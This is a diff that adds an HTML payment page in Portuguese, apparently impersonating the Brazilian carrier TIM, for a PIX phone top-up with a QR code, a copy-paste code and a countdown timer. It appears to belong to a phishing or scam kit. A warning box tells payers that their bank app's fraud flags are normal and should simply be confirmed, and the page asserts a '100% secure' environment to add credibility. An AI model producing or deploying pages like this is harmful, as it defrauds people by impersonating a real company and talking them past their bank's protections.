@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TIM - Pagamento via PIX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
+        body { background-color: #0114C4; margin: 0; padding: 0; color: #333; }
+        .mobile-container { max-width: 480px; margin: 0 auto; background-color: #0114C4; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+        .menu-icon { display: flex; flex-direction: column; gap: 4px; }
+        .menu-icon span { display: block; width: 24px; height: 2px; background-color: white; }
+        .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
+        
+        .pix-main { flex: 1; display: flex; flex-direction: column; }
+        .pix-card { background: white; border-radius: 20px 20px 0 0; padding: 16px 16px 20px; flex: 1; text-align: center; margin-top: 6px; }
+        
+        .pix-header { display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 2px; }
+        .pix-header h2 { font-size: 16px; color: #001A33; font-weight: 800; margin: 0; }
+        .pix-subtitle { font-size: 11px; color: #666; margin-bottom: 10px; line-height: 1.3; }
+        
+        .timer-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 10px; padding: 6px 12px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; }
+        .timer-title { font-size: 13px; font-weight: 800; color: #FF192D; margin: 0; }
+        .timer-badge { background: #FFF4CC; color: #B37700; font-size: 10px; font-weight: 700; padding: 3px 8px; border-radius: 12px; }
+        
+        .qr-label { font-size: 10px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 6px; text-transform: uppercase; }
+        .qr-code { width: 140px; height: 140px; margin: 0 auto 10px; display: block; border-radius: 8px; }
+        
+        .warning-box { background: #FFF9E6; border: 1px solid #FFD633; border-radius: 10px; padding: 6px 10px; display: flex; align-items: center; gap: 8px; text-align: left; margin-bottom: 10px; }
+        .warning-box p { font-size: 10px; color: #995C00; margin: 0; line-height: 1.3; font-weight: 500; }
+        
+        .copy-label { font-size: 10px; font-weight: 800; color: #888; letter-spacing: 0.5px; margin-bottom: 4px; text-transform: uppercase; text-align: center; }
+        .copy-container { display: flex; border-radius: 8px; overflow: hidden; margin-bottom: 12px; border: 1px solid #EAEAEA; }
+        .copy-container input { flex: 1; border: none; background: #FAFAFA; padding: 0 10px; font-size: 11px; color: #666; outline: none; }
+        .btn-copy { background: #20C997; color: white; border: none; padding: 10px 14px; font-weight: 700; font-size: 12px; display: flex; align-items: center; gap: 6px; cursor: pointer; transition: background 0.2s ease; white-space: nowrap; }
+        .btn-copy:active { background: #18a87d; }
+        
+        .details-box { border: 1px solid #EAEAEA; background: #FAFAFA; border-radius: 10px; padding: 0 12px; margin-bottom: 14px; text-align: left; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #EAEAEA; font-size: 12px; }
+        .detail-row:last-child { border-bottom: none; }
+        .detail-row span { color: #666; }
+        .detail-row strong { color: #001A33; font-weight: 800; }
+        .light-text { color: #888 !important; font-weight: 500 !important; }
+        
+        .secure-footer { font-size: 11px; color: #00C853; font-weight: 800; line-height: 1.4; padding-bottom: 14px; }
+        .secure-footer span { color: #888; font-weight: 400; font-size: 10px; }
+
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: white; padding: 12px 24px; border-radius: 30px; font-size: 13px; font-weight: 600; opacity: 0; transition: opacity 0.3s; pointer-events: none; z-index: 999; }
+        .toast.show { opacity: 1; }
+
+        .btn-confirmar { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; padding: 14px; border: none; border-radius: 30px; background: linear-gradient(135deg, #FFCC00, #FFD740); color: #0114C4; font-size: 14px; font-weight: 800; cursor: pointer; box-shadow: 0 4px 16px rgba(255,204,0,0.4); transition: all 0.2s ease; margin-bottom: 16px; }
+        .btn-confirmar:active { transform: scale(0.98); }
+        @keyframes blink { 0% { opacity: 0.2; } 20% { opacity: 1; } 100% { opacity: 0.2; } }
+        .loading-dots span { animation: blink 1.4s infinite both; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        /* Passo a Passo Como Pagar o PIX */
+        .pix-steps-card {
+            background: #F8FAFC;
+            border: 1px solid #E2E8F0;
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+        }
+        .pix-steps-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 800;
+            color: #0114C4;
+            margin-bottom: 14px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #E2E8F0;
+        }
+        .pix-steps-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .pix-step {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .pix-step-badge {
+            background: #0114C4;
+            color: white;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 800;
+            flex-shrink: 0;
+            margin-top: 1px;
+            box-shadow: 0 2px 6px rgba(1, 20, 196, 0.25);
+        }
+        .pix-step-content {
+            font-size: 12px;
+            line-height: 1.45;
+            color: #334155;
+        }
+        .pix-step-content strong {
+            color: #0F172A;
+            font-weight: 700;
+        }
+        .pix-steps-footer {
+            margin-top: 14px;
+            padding: 9px 12px;
+            border-radius: 8px;
+            background: #DCFCE7;
+            border: 1px solid #86EFAC;
+            font-size: 11px;
+            color: #166534;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            line-height: 1.35;
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <header>
+            <a href="../index.html" class="tim-logo-header">
+                <span style="color: #FF192D;">≡</span>
+                <span class="tim-logo-text" style="color: white; letter-spacing: -1px;">TIM</span>
+            </a>
+            <div class="menu-icon">
+                <span></span><span></span><span></span>
+            </div>
+        </header>
+        
+        <main class="pix-main">
+            <div class="pix-card">
+                <div class="pix-header">
+                    <svg viewBox="0 0 512 512" width="20" height="20" fill="#32BCAD"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8zm-154.8 85.3L225 306.8c-4.2 4.2-10.9 4.2-15.1 0l-55.5-55.5c-4.2-4.2-4.2-10.9 0-15.1l55.5-55.5c4.2-4.2 10.9-4.2 15.1 0l31 31c4.2 4.2 4.2 10.9 0 15.1l-15.4 15.4c-2.1 2.1-2.1 5.4 0 7.5l15.4 15.4c4.2 4.2 10.9 4.2 15.1 0l31-31c4.2-4.2 4.2-10.9 0-15.1l-55.5-55.5c-4.2-4.2-10.9-4.2-15.1 0l-55.5 55.5c-12.5 12.5-12.5 32.8 0 45.3l55.5 55.5c12.5 12.5 32.8 12.5 45.3 0l55.5-55.5c4.2-4.2 4.2-10.9 0-15.1l-31-31c-4.1-4.2-10.8-4.2-15 0z"/></svg>
+                    <h2>Pagamento via PIX</h2>
+                </div>
+                <p class="pix-subtitle">Escaneie o QR Code ou copie a chave PIX para concluir o pagamento com segurança.</p>
+                
+                <div class="timer-box">
+                    <div class="timer-title">Expira em <span id="timer">15:00</span></div>
+                    <div class="timer-badge">Aguardando pagamento</div>
+                </div>
+
+                <div class="qr-label">ESCANEIE COM O APP DO SEU BANCO</div>
+                <img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" alt="Gerando QR Code..." class="qr-code" style="background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; text-align: center; font-size: 10px; color: #999;">
+
+                <div class="warning-box">
+                    <span style="font-size:16px;">⚠️</span>
+                    <p>Pagamentos via Pix podem ser sinalizados pelo app do seu banco como medida de proteção. Isso é normal — basta confirmar para prosseguir com segurança.</p>
+                </div>
+
+                <div class="copy-label">CHAVE PIX COPIA E COLA</div>
+                <div class="copy-container">
+                    <input type="text" value="Aguarde, gerando seu PIX..." readonly id="pix-key">
+                    <button class="btn-copy" onclick="copyPix()">
+                        <svg viewBox="0 0 24 24" width="15" height="15" fill="white"><path d="M16 1H4C2.9 1 2 1.9 2 3v14h2V3h12V1zm3 4H8C6.9 5 6 5.9 6 7v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                        COPIAR
+                    </button>
+                </div>
+
+                <!-- Passo a Passo de Como Pagar o PIX -->
+                <div class="pix-steps-card">
+                    <div class="pix-steps-header">
+                        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#0114C4" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <span>Como pagar com PIX:</span>
+                    </div>
+                    <div class="pix-steps-list">
+                        <div class="pix-step">
+                            <div class="pix-step-badge">1</div>
+                            <div class="pix-step-content">
+                                Clique no botão <strong>COPIAR</strong> acima para copiar o código Pix (ou aponte a câmera para o QR Code).
+                            </div>
+                        </div>
+                        <div class="pix-step">
+                            <div class="pix-step-badge">2</div>
+                            <div class="pix-step-content">
+                                Abra o <strong>aplicativo do seu banco</strong> ou instituição financeira.
+                            </div>
+                        </div>
+                        <div class="pix-step">
+                            <div class="pix-step-badge">3</div>
+                            <div class="pix-step-content">
+                                Vá na opção <strong>PIX</strong> e escolha <strong>PIX Copia e Cola</strong>.
+                            </div>
+                        </div>
+                        <div class="pix-step">
+                            <div class="pix-step-badge">4</div>
+                            <div class="pix-step-content">
+                                Cole o código copiado, confira o valor e <strong>confirme o pagamento</strong>.
+                            </div>
+                        </div>
+                    </div>
+                    <div class="pix-steps-footer">
+                        ⚡ <strong>Liberação instantânea:</strong> Seus créditos TIM serão ativados automaticamente na sua linha.
+                    </div>
+                </div>
+
+                <div class="details-box">
+                    <div class="detail-row">
+                        <span>Número</span>
+                        <strong id="display-phone">(41) 99999-9999</strong>
+                    </div>
+                    <div class="detail-row">
+                        <span>Valor</span>
+                        <strong id="display-value" style="font-size:15px; color:#0114C4;">R$ 20,00</strong>
+                    </div>
+                    <div class="detail-row">
+                        <span>Pedido</span>
+                        <span class="light-text" id="display-order">TIM178906...</span>
+                    </div>
+                    <div class="detail-row">
+                        <span>Forma de pagamento</span>
+                        <strong style="display:flex;align-items:center;gap:6px;">
+                            <svg viewBox="0 0 512 512" width="12" height="12" fill="#32BCAD"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8zm-154.8 85.3L225 306.8c-4.2 4.2-10.9 4.2-15.1 0l-55.5-55.5c-4.2-4.2-4.2-10.9 0-15.1l55.5-55.5c4.2-4.2 10.9-4.2 15.1 0l31 31c4.2 4.2 4.2 10.9 0 15.1l-15.4 15.4c-2.1 2.1-2.1 5.4 0 7.5l15.4 15.4c4.2 4.2 10.9 4.2 15.1 0l31-31c4.2-4.2 4.2-10.9 0-15.1l-55.5-55.5c-4.2-4.2-10.9-4.2-15.1 0l-55.5 55.5c-12.5 12.5-12.5 32.8 0 45.3l55.5 55.5c12.5 12.5 32.8 12.5 45.3 0l55.5-55.5c4.2-4.2 4.2-10.9 0-15.1l-31-31c-4.1-4.2-10.8-4.2-15 0z"/></svg>
+                            PIX
+                        </strong>
+                    </div>
+                </div>
+
+                <div class="secure-footer">
+                    🔒 PAGAMENTO SEGURO<br>
+                    <span>Ambiente 100% seguro.</span>
+                </div>
+            </div>
+        </main>
+    </div>
+    
+    <div class="toast" id="toast">Código copiado com sucesso!</div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const phone = urlParams.get('phone');
+        const value = urlParams.get('value');
+        
+        if (phone) document.getElementById('display-phone').textContent = phone;
+        if (value) document.getElementById('display-value').textContent = 'R$ ' + value;
+        
+        document.getElementById('display-order').textContent = 'TIM' + Date.now().toString().substring(3, 15);
+
+        let timeInSeconds = 15 * 60;
+        const timerElement = document.getElementById('timer');
+        
+        const updateTimer = () => {
+            const minutes = Math.floor(timeInSeconds / 60);
+            const seconds = timeInSeconds % 60;
+            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            if (timeInSeconds > 0) timeInSeconds--;
+        };
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        function loadPix() {
+            try {
+                const storedPix = sessionStorage.getItem('pixData');
+                if (storedPix) {
+                    const payData = JSON.parse(storedPix);
+                    document.getElementById('pix-key').value = payData.copyPaste || payData.qrCode;
+                    
+                    const isRealBase64Image = payData.qrCodeBase64 && 
+                        payData.qrCodeBase64 !== '' && 
+                        (payData.qrCodeBase64.startsWith('data:image') || /^[A-Za-z0-9+/=]{50,}$/.test(payData.qrCodeBase64.substring(0, 100)));
+                    
+                    if (isRealBase64Image) {
+                        if (payData.qrCodeBase64.startsWith('data:image')) {
+                            document.querySelector('.qr-code').src = payData.qrCodeBase64;
+                        } else {
+                            document.querySelector('.qr-code').src = 'data:image/png;base64,' + payData.qrCodeBase64;
+                        }
+                    } else if (payData.qrCodeUrl && payData.qrCodeUrl !== '') {
+                        document.querySelector('.qr-code').src = payData.qrCodeUrl;
+                    } else {
+                        const pixString = payData.copyPaste || payData.qrCode || payData.qrCodeBase64;
+                        document.querySelector('.qr-code').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(pixString);
+                    }
+                } else {
+                    alert('Sessão expirada. Por favor, inicie a recarga novamente.');
+                    window.location.href = 'pagamento.html';
+                }
+            } catch (error) {
+                console.error('Falha ao ler dados do PIX:', error);
+            }
+        }
+        loadPix();
+
+        function startStatusPolling() {
+            try {
+                const storedPix = sessionStorage.getItem('pixData');
+                if (storedPix) {
+                    const payData = JSON.parse(storedPix);
+                    const transactionId = payData.transactionId;
+                    
+                    if (transactionId) {
+                        const pollInterval = setInterval(async () => {
+                            try {
+                                const resp = await fetch('/api/status/' + transactionId + (phone ? '?phone=' + encodeURIComponent(phone) : ''));
+                                const statusData = await resp.json();
+                                const status = (statusData.data?.status || statusData.status || '').toString().toUpperCase();
+                                if (status === 'PAID' || status === 'APPROVED') {
+                                    clearInterval(pollInterval);
+                                    window.location.href = `sucesso.html?phone=${encodeURIComponent(phone || '')}&value=${encodeURIComponent(value || '')}`;
+                                }
+                            } catch (e) {}
+                        }, 4000);
+                    }
+                }
+            } catch (e) {}
+        }
+        startStatusPolling();
+
+        function copyPix() {
+            const pixKey = document.getElementById('pix-key');
+            pixKey.select();
+            pixKey.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            
+            const toast = document.getElementById('toast');
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2000);
+        }
+    </script>
+</body>
+</html>
